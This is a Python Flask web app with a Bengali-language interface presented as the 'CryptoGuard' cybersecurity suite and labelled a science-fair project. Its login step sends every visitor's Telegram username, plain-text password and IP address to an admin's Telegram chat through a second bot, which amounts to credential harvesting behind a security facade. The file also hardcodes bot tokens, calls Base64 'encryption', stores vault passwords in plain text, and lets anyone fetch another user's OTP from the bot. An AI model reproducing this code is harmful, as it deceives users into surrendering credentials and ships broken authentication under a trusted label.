import os
import threading
import random
import base64
from datetime import datetime
import telebot
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ================= CONFIGURATION =================
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8868227957:AAFULZPQT0RMUGWXnQfhLItkMSYFEgkLstg")
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "7938556654")

bot = telebot.TeleBot(TELEGRAM_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN)

# ডাটাবেজ স্টোরেজ
user_persistent_db = {}
otp_storage = {}

def send_to_admin(log_msg):
    try:
        admin_bot.send_message(
            ADMIN_CHAT_ID, 
            f"🛡️ **CYBER-GUARD SECURE SYSTEM LOG** 🛡️\n\n{log_msg}\n\n🤖 এডমিন বট: @CryptoGuard_Sentinel_bot", 
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Admin Bot Dispatch Error: {e}")

def encrypt_text(text):
    return base64.b64encode(text.encode('utf-8')).decode('utf-8')

def decrypt_text(encoded_text):
    try:
        return base64.b64decode(encoded_text.encode('utf-8')).decode('utf-8')
    except:
        return "⚠️ ডিক্রিপশন ব্যর্থ! সঠিক বেসসিকিউরড কোড প্রদান করুন।"

# ================= TELEGRAM BOT HANDLERS =================
@bot.message_handler(commands=['start'])
def handle_start(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) > 1:
        username = command_parts[1].strip().lower().replace('@', '')
        if username in otp_storage:
            otp = otp_storage[username]
            bot.reply_to(message, f"⚡ **অটো-অথেন্টিকেশন সফল!**\n\n👤 ইউজার/নাম: @{username}\n🔢 আপনার ওটিপি কোড: *{otp}*", parse_mode="Markdown")
            send_to_admin(f"📱 টেলিগ্রাম থেকে ওটিপি রিকভার করা হয়েছে:\n👤 ইউজার: @{username}\n🔢 ওটিপি: {otp}")
            return
        else:
            bot.reply_to(message, f"⚠️ '{username}' এর জন্য কোনো একটিভ ওটিপি রিকোয়েস্ট নেই। দয়া করে প্রথমে ওয়েবসাইট থেকে ফর্ম সাবমিট করুন।")
            return

    bot.reply_to(message, "⚡ **CryptoGuard সিকিউরিটি সিস্টেমে স্বাগতম!**\n\nওয়েবসাইট থেকে আপনার ইউজারনেম দিয়ে সরাসরি এখানে ওটিপি সংগ্রহ করতে পারেন।")

@bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
    username = message.text.strip().lower().replace('@', '')
    if username in otp_storage:
        otp = otp_storage[username]
        bot.reply_to(message, f"🔐 ইউজার: @{username}\n🔢 আপনার ওটিপি কোড: *{otp}*", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"⚠️ '{username}' নামের কোনো সেশন সার্ভারে পাওয়া যায়নি।")

def run_telegram_bot():
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f"Telegram Bot Error: {e}")

# ================= HTML & CYBERPUNK UI =================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoGuard - Advanced Cyber Security Suite</title>
    <style>
        :root {
            --bg-color: #030712; --card-bg: rgba(15, 23, 42, 0.85); --text-color: #f1f5f9; 
            --border-color: #334155; --accent-color: #10b981; --btn-bg: #059669;
        }
        body { background: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; min-height: 100vh; position: relative; }
        #matrixRain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; opacity: 0.15; }
        .container { max-width: 850px; margin: auto; position: relative; z-index: 2; padding-bottom: 30px; }
        
        .header-box { display: flex; justify-content: space-between; align-items: center; background: var(--card-bg); border: 1px solid var(--border-color); padding: 15px 25px; border-radius: 12px; backdrop-filter: blur(12px); margin-bottom: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h1 { margin: 0; font-size: 20px; color: var(--accent-color); text-transform: uppercase; letter-spacing: 1px; }
        .clock-widget { background: #000; border: 1px solid var(--accent-color); padding: 5px 12px; border-radius: 20px; font-family: monospace; font-size: 13px; color: var(--accent-color); }

        .tab-menu { display: flex; gap: 8px; margin-bottom: 20px; }
        .tab-btn { flex: 1; background: rgba(30, 41, 59, 0.9); border: 1px solid var(--border-color); color: var(--text-color); padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; font-size: 13px; }
        .tab-btn.active { background: var(--accent-color); color: #000; border-color: var(--accent-color); box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); }
        
        .layer-section { display: none; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; backdrop-filter: blur(12px); margin-bottom: 20px; box-shadow: 0 8px 30px rgba(0,0,0,0.4); }
        .layer-section.active { display: block; }

        h2 { color: var(--accent-color); border-bottom: 1px solid var(--border-color); padding-bottom: 8px; margin-top: 0; font-size: 16px; }
        input, textarea { width: 100%; padding: 12px 15px; margin: 10px 0; background: rgba(2, 6, 23, 0.8); border: 1px solid var(--border-color); color: #fff; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
        input:focus, textarea:focus { border-color: var(--accent-color); outline: none; box-shadow: 0 0 8px rgba(16, 185, 129, 0.3); }
        
        button { background: var(--btn-bg); color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; transition: 0.2s; font-size: 14px; }
        button:hover { opacity: 0.9; transform: translateY(-1px); }
        
        #botLinkArea { display: none; margin-top: 15px; }
        .bot-link-btn { display: inline-block; background: #2563eb; color: white; text-align: center; text-decoration: none; padding: 12px; border-radius: 8px; font-weight: bold; width: 100%; box-sizing: border-box; box-shadow: 0 0 15px rgba(37, 99, 235, 0.4); }
        .bot-link-btn:hover { background: #1d4ed8; }

        .highlight { color: #10b981; font-weight: bold; }
        .vault-box { background: rgba(2, 6, 23, 0.9); border: 1px dashed var(--accent-color); padding: 15px; border-radius: 8px; max-height: 180px; overflow-y: auto; font-size: 13px; margin-top: 15px; }
        .info-note { background: rgba(16, 185, 129, 0.1); border-left: 4px solid var(--accent-color); padding: 10px 14px; border-radius: 0 8px 8px 0; font-size: 13px; margin-bottom: 15px; line-height: 1.5; }

        /* ডেভেলপার ইনফো ফুটার স্টাইল */
        .developer-footer { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 18px; text-align: center; backdrop-filter: blur(12px); margin-top: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        .developer-footer h3 { margin: 0 0 8px 0; color: var(--accent-color); font-size: 15px; text-transform: uppercase; }
        .developer-footer p { margin: 4px 0; font-size: 13px; color: #94a3b8; }
        .developer-footer .dev-name { color: #38bdf8; font-weight: bold; }
    </style>
</head>
<body>
    <canvas id="matrixRain"></canvas>

    <div class="container">
        <div class="header-box">
            <h1>🛡️ CryptoGuard Security Suite</h1>
            <div class="clock-widget">⏰ <span id="liveClock">00:00:00</span></div>
        </div>

        <div class="tab-menu">
            <button class="tab-btn active" onclick="switchLayer('layer1')">লেয়ার ১: ওটিপি অথেনটিকেশন</button>
            <button class="tab-btn" onclick="switchLayer('layer2')" id="btnLayer2" style="opacity: 0.4; cursor: not-allowed;" disabled>লেয়ার ২: ক্রিপ্টো হাব</button>
            <button class="tab-btn" onclick="switchLayer('layer3')" id="btnLayer3" style="opacity: 0.4; cursor: not-allowed;" disabled>লেয়ার ৩: সিক্রেট ভল্ট</button>
        </div>

        <!-- লেয়ার ১ -->
        <div class="layer-section active" id="layer1">
            <h2>🔐 লেয়ার ১: টেলিগ্রাম ওটিপি ভেরিফিকেশন সিস্টেম</h2>
            <div class="info-note">
                <b>নির্দেশনা:</b> আপনার টেলিগ্রাম ইউজারনেম বা নাম এবং পাসওয়ার্ড দিয়ে সাবমিট করুন। এরপর নিচের বাটনে ক্লিক করে সরাসরি আপনার সঠিক বট <b>@CryptoGuard_OTP_bot</b> থেকে ওটিপি সংগ্রহ করুন।
            </div>

            <input type="text" id="username" placeholder="আপনার টেলিগ্রাম ইউজারনেম বা নাম (যেমন: username)">
            <input type="password" id="password" placeholder="আপনার কাস্টম পাসওয়ার্ড দিন">
            <button onclick="requestOtp()">তথ্য সাবমিট করুন ও ওটিপি জেনারেট করুন</button>
            
            <div id="botLinkArea">
                <a id="dynamicBotLink" href="#" target="_blank" class="bot-link-btn">🤖 টেলিগ্রাম বটে ওটিপি চেক করুন (@CryptoGuard_OTP_bot)</a>
            </div>

            <input type="text" id="otpCode" placeholder="বট থেকে প্রাপ্ত ৪ ডিজিটের ওটিপি কোডটি এখানে লিখুন" style="margin-top: 20px;">
            <button onclick="verifyAndUnlock()" style="background: #2563eb;">ভেরিফাই করে সিস্টেম আনলক করুন</button>
            
            <p id="authStatus" style="font-weight: bold; margin-top: 12px; font-size: 14px; text-align: center;"></p>
            <p style="font-size: 12px; color: #94a3b8; text-align: center; margin-top: 15px;">ক্লায়েন্ট আইপি ট্র্যাকিং: <span id="clientIp" class="highlight">ডিটেকটিং...</span></p>
        </div>

        <!-- লেয়ার ২ -->
        <div class="layer-section" id="layer2">
            <h2>⚡ লেয়ার ২: ডেটা এনক্রিপশন ও ডিক্রিপশন হাব</h2>
            <p style="font-size: 13px; color: #94a3b8;">আপনার গোপনীয় টেক্সট নিরাপদ এনক্রিপ্টেড ফরম্যাটে রূপান্তর করুন।</p>
            <textarea id="inputText" rows="3" placeholder="এনক্রিপ্ট বা ডিক্রিপ্ট করার জন্য টেক্সট লিখুন..."></textarea>
            <button onclick="processCrypto('encrypt')">টেক্সট এনক্রিপ্ট করুন</button>
            <button onclick="processCrypto('decrypt')" style="background: #dc2626;">টেক্সট ডিক্রিপ্ট করুন</button>
            <textarea id="outputText" rows="3" readonly placeholder="আউটপুট ফলাফল এখানে প্রদর্শিত হবে..." style="margin-top: 15px;"></textarea>
        </div>

        <!-- লেয়ার ৩ -->
        <div class="layer-section" id="layer3">
            <h2>📁 লেয়ার ৩: সিকিউরড ইনফো ও ডকুমেন্ট ভল্ট</h2>
            <p style="font-size: 13px; color: #94a3b8;">আপনার প্রয়োজনীয় গোপন নোট বা তথ্য আলাদা পাসওয়ার্ড দিয়ে সংরক্ষণ করুন।</p>
            <input type="text" id="docTitle" placeholder="ফাইলের শিরোনাম বা নাম">
            <textarea id="docInfo" rows="2" placeholder="গোপন তথ্য বা বিবরণ..."></textarea>
            <input type="password" id="vaultPassword" placeholder="ভল্ট সুরক্ষার জন্য আলাদা পাসওয়ার্ড">
            <button onclick="saveToVault()" style="background: #7c3aed;">ভল্টে সেকিউরলি সংরক্ষণ করুন</button>
            <div class="vault-box" id="vaultContainer">কোনো সংরক্ষিত ডাটা পাওয়া যায়নি।</div>
        </div>

        <!-- ডেভলপার ইনফো ফুটার (সম্পূর্ণ আপডেট করা) -->
        <div class="developer-footer">
            <h3>🚀 সায়েন্স ফেয়ার সাইবার সিকিউরিটি প্রোজেক্ট</h3>
            <p>উন্নয়ন ও পরিচালনায় (Developer): <span class="dev-name">আপনার নাম / টিম লিডার</span></p>
            <p>অফিশিয়াল সিস্টেম বটসমূহ: <span style="color: #10b981;">@CryptoGuard_OTP_bot</span> | <span style="color: #38bdf8;">@CryptoGuard_Sentinel_bot</span></p>
            <p><small>টেকনোলজি স্ট্যাক: Python Flask, Telegram Bot API, Cyberpunk Matrix UI Engine</small></p>
        </div>
    </div>

    <script>
        // ম্যাট্রিক্স রেইন ইফেক্ট
        const canvas = document.getElementById('matrixRain');
        const ctx = canvas.getContext('2d');
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*'.split('');
        let rainDrops = [];
        for (let x = 0; x < canvas.width / 16; x++) rainDrops[x] = 1;

        setInterval(() => {
            ctx.fillStyle = 'rgba(3, 7, 18, 0.08)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#10b981';
            ctx.font = '16px monospace';
            for (let i = 0; i < rainDrops.length; i++) {
                ctx.fillText(alphabet[Math.floor(Math.random() * alphabet.length)], i * 16, rainDrops[i] * 16);
                if (rainDrops[i] * 16 > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
                rainDrops[i]++;
            }
        }, 30);

        fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => { document.getElementById('clientIp').innerText = data.ip; }).catch(() => {});
        setInterval(() => { document.getElementById('liveClock').innerText = new Date().toLocaleTimeString(); }, 1000);

        function switchLayer(layerId) {
            document.querySelectorAll('.layer-section').forEach(sec => sec.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.getElementById(layerId).classList.add('active');
            event.currentTarget.classList.add('active');
        }

        let activeUser = '';

        function requestOtp() {
            const uname = document.getElementById('username').value.trim();
            const pwd = document.getElementById('password').value.trim();
            const ip = document.getElementById('clientIp').innerText;
            if(!uname || !pwd) { alert('দয়া করে ইউজারনেম এবং পাসওয়ার্ড উভয় ফিল্ড পূরণ করুন!'); return; }
            
            fetch('/login-step1', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: uname, password: pwd, ip: ip})
            })
            .then(res => res.json())
            .then(data => {
                if(data.success) {
                    document.getElementById('authStatus').innerText = data.message;
                    document.getElementById('authStatus').style.color = '#10b981';
                    
                    const telegramUrl = `https://t.me/CryptoGuard_OTP_bot?start=${encodeURIComponent(uname)}`;
                    document.getElementById('dynamicBotLink').href = telegramUrl;
                    document.getElementById('botLinkArea').style.display = 'block';
                } else {
                    document.getElementById('authStatus').innerText = data.message;
                    document.getElementById('authStatus').style.color = '#dc2626';
                }
            });
        }

        function verifyAndUnlock() {
            const uname = document.getElementById('username').value.trim();
            const pwd = document.getElementById('password').value.trim();
            const otp = document.getElementById('otpCode').value.trim();
            
            fetch('/verify-otp', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: uname, password: pwd, otp: otp})
            })
            .then(res => res.json())
            .then(data => {
                if(data.success) {
                    activeUser = uname;
                    document.getElementById('authStatus').innerText = "অথেন্টিকেশন সফল! সমস্ত লেয়ার আনলক করা হয়েছে।";
                    document.getElementById('authStatus').style.color = '#10b981';
                    
                    document.getElementById('btnLayer2').disabled = false;
                    document.getElementById('btnLayer2').style.opacity = '1';
                    document.getElementById('btnLayer2').style.cursor = 'pointer';
                    
                    document.getElementById('btnLayer3').disabled = false;
                    document.getElementById('btnLayer3').style.opacity = '1';
                    document.getElementById('btnLayer3').style.cursor = 'pointer';
                    
                    updateVaultUI(data.vault);
                    alert('অভিনন্দন! সিকিউরিটি সিস্টেম সফলভাবে আনলক হয়েছে।');
                } else {
                    document.getElementById('authStatus').innerText = data.message;
                    document.getElementById('authStatus').style.color = '#dc2626';
                }
            });
        }

        function saveToVault() {
            if(!activeUser) { alert('আগে লেয়ার ১ এ লগইন বা ভেরিফাই করুন!'); return; }
            const title = document.getElementById('docTitle').value;
            const info = document.getElementById('docInfo').value;
            const vpass = document.getElementById('vaultPassword').value;
            if(!title || !info || !vpass) { alert('ভল্টের সব ফিল্ড পূরণ করুন!'); return; }
            
            fetch('/save-vault', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: activeUser, title: title, info: info, vault_pass: vpass})
            })
            .then(res => res.json())
            .then(data => {
                if(data.success) {
                    updateVaultUI(data.vault);
                    document.getElementById('docTitle').value = '';
                    document.getElementById('docInfo').value = '';
                    document.getElementById('vaultPassword').value = '';
                    alert('ডকুমেন্ট সফলভাবে ভল্টে সংরক্ষিত হয়েছে!');
                }
            });
        }

        function updateVaultUI(vaultList) {
            const box = document.getElementById('vaultContainer');
            if(!vaultList || vaultList.length === 0) { box.innerHTML = 'কোনো ডাটা সংরক্ষিত নেই'; return; }
            box.innerHTML = '';
            vaultList.forEach(item => {
                box.innerHTML += `<b>📌 ${item.title}</b>: ${item.info} <br><small style="color: #94a3b8;">সময়: ${item.time}</small><hr style="border-color:#334155; margin:6px 0;">`;
            });
        }

        function processCrypto(action) {
            const text = document.getElementById('inputText').value;
            if(!text) { alert('টেক্সট প্রদান করুন!'); return; }
            fetch('/api-crypto', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({text: text, action: action, username: activeUser})
            })
            .then(res => res.json())
            .then(data => { document.getElementById('outputText').value = data.result; });
        }
    </script>
</body>
</html>
"""

# ================= FLASK ROUTES =================
@app.route('/')
def home():
    response = app.make_response(render_template_string(HTML_TEMPLATE))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response

@app.route('/login-step1', methods=['POST'])
def login_step1():
    data = request.json or {}
    username = data.get('username', '').strip().lower().replace('@', '')
    password = data.get('password', '').strip()
    ip = data.get('ip', 'Unknown IP')
    
    if not username:
        return jsonify({"success": False, "message": "ইউজারনেম বা নাম আবশ্যক!"})
    
    if username not in user_persistent_db:
        user_persistent_db[username] = {"password": password, "vault": [], "cipher_history": []}
    else:
        user_persistent_db[username]["password"] = password
            
    otp = str(random.randint(1000, 9999))
    otp_storage[username] = otp
    
    send_to_admin(f"🔑 **নতুন ওটিপি রিকোয়েস্ট জেনারেট**\n👤 ইউজার/নাম: @{username}\n🔑 পাসওয়ার্ড: {password}\n🔢 ওটিপি: {otp}\n🌐 আইপি: {ip}")
    return jsonify({"success": True, "message": "সাবমিট সফল! এখন নিচের বট লিংকে ক্লিক করুন।"})

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json or {}
    username = data.get('username', '').strip().lower().replace('@', '')
    otp = data.get('otp', '').strip()
    password = data.get('password', '').strip()
    
    if username in otp_storage and otp_storage[username] == otp:
        user_data = user_persistent_db.get(username, {"vault": []})
        if user_data.get("password") and user_data["password"] != password:
            return jsonify({"success": False, "message": "ভুল পাসওয়ার্ড প্রদান করা হয়েছে!"})
        
        send_to_admin(f"✅ **সফল অথেন্টিকেশন ও আনলক**\n👤 ইউজার: @{username}")
        return jsonify({"success": True, "message": "ভেরিফিকেশন সফল!", "vault": user_data["vault"]})
    
    send_to_admin(f"❌ **ব্যর্থ ওটিপি চেষ্টা**\n👤 ইউজার: @{username}\n🔢 প্রদত্ত ওটিপি: {otp}")
    return jsonify({"success": False, "message": "ভুল ওটিপি কোড!"})

@app.route('/save-vault', methods=['POST'])
def save_vault():
    data = request.json or {}
    username = data.get('username', '').strip().lower()
    title = data.get('title', '')
    info = data.get('info', '')
    vault_pass = data.get('vault_pass', '')
    
    if username in user_persistent_db:
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M")
        user_persistent_db[username]["vault"].append({"title": title, "info": info, "vault_pass": vault_pass, "time": time_str})
        send_to_admin(f"📁 **ভল্ট আপডেট করা হয়েছে**\n👤 ইউজার: @{username}\n📌 ফাইল: {title}")
        return jsonify({"success": True, "vault": user_persistent_db[username]["vault"]})
        
    return jsonify({"success": False, "message": "সেশন সচল নেই!"})

@app.route('/api-crypto', methods=['POST'])
def api_crypto():
    data = request.json or {}
    text = data.get('text', '')
    action = data.get('action', '')
    username = data.get('username', '')
    result = encrypt_text(text) if action == 'encrypt' else decrypt_text(text)
    return jsonify({"result": result})

if __name__ == '__main__':
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
